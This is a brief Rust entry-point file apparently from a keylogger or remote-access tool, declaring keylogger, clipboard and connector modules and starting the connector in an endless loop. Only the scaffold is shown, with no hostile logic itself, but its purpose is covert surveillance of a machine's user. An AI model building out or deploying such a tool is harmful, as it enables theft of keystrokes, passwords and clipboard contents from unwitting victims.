use crate::connector::start_connector;

mod keylogger;
mod clipboard;
mod utils;
mod connector;
mod myconst;
mod config;

#[tokio::main]
async fn main() {
    start_connector().await;
    // start_logger();
    // start_clipboard();
    loop {}
}


